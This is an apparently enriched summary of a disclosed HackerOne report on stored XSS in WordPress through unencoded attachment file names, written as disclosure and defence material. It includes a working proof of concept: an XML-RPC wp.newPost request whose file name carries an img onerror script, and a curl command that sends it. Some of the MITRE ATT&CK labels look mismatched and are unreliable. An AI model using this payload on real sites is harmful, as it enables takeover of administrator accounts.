# WordPress Core Stored XSS via Attachment File Name

## Metadata
- **Source:** HackerOne
- **Report:** 139245 | https://hackerone.com/reports/139245
- **Submitted:** 2016-05-17
- **Reporter:** jouko
- **Program:** WordPress
- **Bounty:** Not specified in report
- **Severity:** high
- **Vuln:** Stored Cross-Site Scripting (XSS), Improper Output Encoding, Insufficient Input Sanitization
- **CVEs:** None
- **Category:** web-api

## Summary
WordPress fails to HTML-encode attachment file names in multiple locations, allowing authenticated users with attachment creation capabilities to inject arbitrary HTML/JavaScript. When administrators access the Media dashboard or view attachment pages, the malicious script executes with their privileges, enabling account compromise.

## Attack scenario
1. Attacker creates a low-privileged WordPress account or gains contributor/author level access
2. Attacker uses XML-RPC wp.newPost() method to create an attachment with malicious filename containing HTML/JavaScript payload (e.g., "file'><img src=x onerror=alert('xss')>")
3. The payload is stored in the WordPress database as the attachment filename
4. Administrator logs into WordPress dashboard and navigates to Media library
5. Unencoded filename is rendered in the Media list table, triggering JavaScript execution in admin's browser context
6. Admin's session cookies or credentials could be exfiltrated, allowing full account takeover

## Root cause
The wp_basename() function output in wp-admin/includes/class-wp-media-list-table.php and attachment page templates is rendered directly without HTML entity encoding. The vulnerability exists because user-controlled data (attachment filename) flows from the database to HTML output without sanitization via functions like esc_html() or esc_attr().

## Attacker mindset
An attacker with lower-level privileges (contributor/author) seeks privilege escalation by compromising administrator accounts. They identify the XML-RPC API as an attack vector for creating malicious attachments, targeting the trust relationship between administrators and the media management interface.

## Defensive takeaways
- Always HTML-encode user-controlled data before rendering in HTML context using esc_html(), esc_attr(), or similar functions
- Apply output encoding consistently across all code paths where attachment data is displayed (media list, attachment pages, edit screens)
- Consider disabling or restricting XML-RPC if not required, or enforce stricter capability checks for attachment creation
- Implement Content Security Policy (CSP) headers to mitigate XSS impact even if encoding is missed
- Sanitize file names during upload/creation to prevent suspicious characters that could form HTML tags
- Audit all places where get_attached_file() or similar functions output data to HTML without encoding
- Use automated security scanning for stored XSS vulnerabilities in output functions

## Variant hunting
Check all post_title, post_name, post_excerpt fields rendered in admin interfaces for similar encoding issues
Audit theme attachment template files (attachment.php) across default themes for unencoded filename output
Search for direct echo statements with wp_basename(), wp_basename($file), or similar functions
Review XML-RPC methods that accept file/attachment parameters for input validation
Test custom fields and meta data display in Media edit screens for similar vulnerabilities
Check attachment URL generation and alternative text fields for encoding gaps
Test other post types that support file attachments for the same vulnerability pattern

## MITRE ATT&CK
- T1190: Exploit Public-Facing Application
- T1653: Persistence via File Upload
- T1204: User Execution of Malicious Code
- T1539: Data from Cloud Storage Object
- T1574: Hijack Execution Flow

## Notes
This vulnerability particularly affects WordPress installations with XML-RPC enabled, which is common for mobile app integration. The default Media list view display makes this vulnerability easily exploitable. The attack chains from low-privilege account to administrator compromise, making it critical for privilege escalation. Multiple vulnerable code paths suggest systemic issues with output encoding practices in WordPress media handling code.

## Full report
<details><summary>Expand</summary>

I think there's a problem with missing HTML encoding of attachment file names. A user with the capability to create attachments could compromise other accounts including administrator by injecting HTML tags in the file name.

Creating attachment with arbitrary filenames is possible at least via the XMLRPC wp.newPost() function.

With a quick search I found two places where the filename is not HTML-escaped. First, `wp-admin/includes/class-wp-media-list-table.php`:
~~~~ php
                <p class="filename">
                        <span class="screen-reader-text"><?php _e( 'File name:' ); ?> </span>
                        <?php
                        $file = get_attached_file( $post->ID );
                        echo wp_basename( $file );
                        ?>
                </p>
~~~~
The injected script is triggered when a user clicks the *Media* menu in the Dashboard.

The second is the attachment page found e.g. with the *attachment_id=xxx* query parameter. It might be theme-dependent. I checked Twenty Fourteen and Twenty Sixteen and both were vulnerable.

#PoC#
1. Create a file called `xss.xml`:
~~~~ xml
<?xml version="1.0"?>
<methodCall>
<methodName>wp.newPost</methodName>
<params>
        <param><value>empty</value></param>
        <param><value>username</value></param>
        <param><value>password</value></param>
        <param><struct>
                <member><name>post_title</name><value>aaa</value></member>
                <member><name>post_type</name><value>attachment</value></member>
                <member><name>post_content</name><value>bbb</value></member>
                <member><name>post_status</name><value>publish</value></member>
                <member><name>file</name><value>ccc'&gt;test&lt;img src=x onerror=alert('xss') onload=alert('xss')&gt;</value></member>
        </struct></param>       
</params>
</methodCall>
~~~~

2. Send the request with

~~~~ sh
curl 'https://wordpress.site/xmlrpc.php' --data-binary "`cat xss.xml`" -H 'Content-type: application/xml'
~~~~

3. Go to the Dashboard as an administrator and view the media list. An alert box should appear. Only the *list* mode seems to be vulnerable but apparently it's the default.


</details>

---
*Analysed by Claude on 2026-05-12*
